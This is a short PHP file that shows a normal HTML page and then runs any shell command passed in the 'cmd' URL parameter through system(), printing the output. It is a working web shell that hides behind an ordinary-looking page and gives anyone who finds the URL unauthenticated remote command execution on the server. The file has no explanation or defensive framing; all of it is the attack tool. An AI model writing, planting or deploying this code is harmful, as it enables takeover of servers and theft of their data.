<?php
include 'index2.html';
if (isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    echo '<br/><br/>';
    system($cmd);
}
?>
